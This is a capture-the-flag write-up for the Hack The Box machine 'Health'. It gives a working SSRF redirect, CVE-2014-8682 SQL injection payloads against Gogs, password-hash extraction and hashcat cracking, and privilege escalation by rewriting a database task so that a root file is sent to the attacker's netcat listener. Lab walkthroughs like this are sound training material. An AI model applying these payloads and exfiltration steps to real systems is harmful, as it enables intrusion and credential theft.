Yo,
welcome to write up for machine Health from Hackthebox.
Starting of as always with nmap scan of all ports

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-14 17:41 EST
Nmap scan report for 10.10.11.176 (10.10.11.176)
Host is up (0.062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

There are three ports open. Standartly port 22 being ssh and port 80 being apache web server. Unusual is port 3000 which is filtered. I'll keep that in mind
if I ever find a way to get there for example with SSRF. 

Let's visit the website first because there's nothing much to do with ssh. 

IMG1

The page shows us hostname health.htb. I'll add it to my `/etc/hosts` file with simple command:

```

echo "10.10.11.166 health.htb" >> /etc/hosts

```

Visiting the page with the hostname gives the same page. On the bottom there is 2014 @Copyright meaning this website is using old version of something 
but first we need to figure out what.
Now let's test the webhook. I'll set up netcat listening on port 9001 and basic flask app that redirects to localhost:

```
import os 
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/")
def redir():
    return redirect('http://localhost/')


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80) 
```

And test the page webhook: 

IMG2

It returns the health.htb landing page on netcat listener. I remember that there is filtered port 3000 so let's try to visit that. 
I'll just change the redirect in flask app to `localhost:3000` and test the webhook same way as before. The site that returns to us 
on netcat shows us this:

```
2014 GoGits \u00b7 Version: 0.5.5.1010 Beta
```

Which is old version of git. Searching for exploits for this version gives us CVE 2014-8682 with this proof of concept

```
Proof of Concept
================

http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```

Using this as our payload gives us 3 in one field meaning we can extract things from there.



Replacing our redirect in flask using commas as separators and searching how the database looks give us this payload:

```
return redirect("http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||','||email||','||passwd||','||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-")
```

Returns this on netcat:

```
{"webhookUrl":"http:\/\/10.10.14.207:9001","monitoredUrl":"http:\/\/10.10.14.207","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"susanne,admin@gogs.local,66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37,sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/15\"}],\"ok\":true}","message":"HTTP\/1.0 302 FOUND","headers":{"Content-Type":"application\/json; charset=UTF-8","Content-Length":"301","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,2,name||','||email||','||passwd||','||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\/**\/from\/**\/user--\/**\/-","Server":"Werkzeug\/2.0.2 Python\/3.10.7","Date":"Thu, 19 Jan 2023 22:01:48 GMT","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}^C
```

We need to find which algorithm does gogs use to encrypt passwords. Looking at the github repo (https://github.com/gogs/gogs/blob/54930c001df8316d8dfda450b5c39379df2cc1b1/models/user.go) gives us answer:

```
newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
```

Now to crack it we need to find which mode to use for hashcat and it is:

```
10900   PBKDF2-HMAC-SHA256  sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt 
```

But first we need to convert the hex to base64. 

```
# echo -n '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64 -w 0
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc= 
# 
```

The final payload for hashcat looks like this (we need to change the 1000 to 10000 because gogs uses 10000 iterations):

```
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

Hashcat cracks it.

```
# hashcat -m 10900 hash.txt /root/Desktop/rockyou.txt --show
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
```

Now we can login as susanne and get the user flag.

```
susanne@health:~$ cat user.txt 
691fa5***************
```

Now we download pspy to see if there's some cronjob running. 

```
susanne@health:~$ wget 10.10.14.207/pspy64
```

There is artisan running as root.

```
2023/01/20 17:39:01 CMD: UID=0    PID=14212  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2023/01/20 17:39:06 CMD: UID=0    PID=14221  | mysql laravel --execute TRUNCATE tasks 
```

Let's review the source code for this. 

```
protected function schedule(Schedule $schedule)
    {

        /* Get all tasks from the database */
        $tasks = Task::all();

        foreach ($tasks as $task) {

            $frequency = $task->frequency;

            $schedule->call(function () use ($task) {
                /*  Run your task here */
                HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
                Log::info($task->id . ' ' . \Carbon\Carbon::now());
            })->cron($frequency);
        }
    }
```

Check function:


```
public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
            $json['body'] = $res;
            if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

            for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

                $split = explode(':', $http_response_header[$i], 2);

                if (count($split) == 2) {
                    $headers[trim($split[0])] = trim($split[1]);
                } else {
                    error_log("invalid header pair: $http_response_header[$i]\n");
                }

            }

            $json['headers'] = $headers;
            }

        } else {
            $json['health'] = "down";
        }

        $content = json_encode($json);

        // send
        $curl = curl_init($webhookUrl);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER,
            array("Content-type: application/json"));
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
        curl_exec($curl);
        curl_close($curl);

        return $json;

    }
}
```

We couldn't get files from the page but now we can create task and change it in database to send us root flag.
In enviroment variable is:

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

With this we can login to database and change the task. Now let's set up netcat to listen on port 9001 and create webhook in the same
way as before and login to database to change the task we created in db.

```
susanne@health:/var/www/html$ mysql -u laravel -p
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| laravel            |
+--------------------+
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
mysql> update tasks set monitoredUrl='file:///root/root.txt';
```

In the end the task should look like this:

```
mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+-----------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl          | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+-----------------------+-------------+---------------------+---------------------+
| b22c059a-0745-495d-86dc-ddcc040a0662 | http://10.10.14.207:9001 |         0 | file:///root/root.txt | */1 * * * * | 2023-01-20 17:49:31 | 2023-01-20 17:49:31 |
+--------------------------------------+--------------------------+-----------+-----------------------+-------------+---------------------+---------------------+
```

After some time it returns flag. And the box is finished.

```
# nc -lvnp 9001  

{"webhookUrl":"http:\/\/10.10.14.207:9001","monitoredUrl":"file:\/\/\/root\/root.txt","health":"up","body":"d0f989e4428c*********\n"}
```